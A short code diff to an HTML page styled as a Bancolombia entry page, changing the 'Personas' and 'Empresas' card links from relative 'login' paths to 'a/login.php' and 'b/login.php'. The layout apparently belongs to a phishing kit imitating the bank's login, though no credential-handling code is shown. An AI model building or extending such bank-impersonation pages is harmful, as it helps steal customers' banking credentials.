@@ -184,7 +184,7 @@ body {
 
   <div class="cards">
 
-    <a href="a/login" class="card card-personas">
+    <a href="a/login.php" class="card card-personas">
       <div class="card-body">
         <div class="card-title">Bancolombia Personas</div>
         <div class="card-desc">Si manejas tus cuentas y productos en la Sucursal Virtual Personas y app Mi Bancolombia.</div>
@@ -196,7 +196,7 @@ body {
       </div>
     </a>
 
-    <a href="b/login" class="card card-empresas">
+    <a href="b/login.php" class="card card-empresas">
       <div class="card-body">
         <div class="card-title">Bancolombia Empresas</div>
         <div class="card-desc">Si manejas tus productos en la Sucursal Virtual Empresas y aún no te has cambiado al nuevo canal.</div>
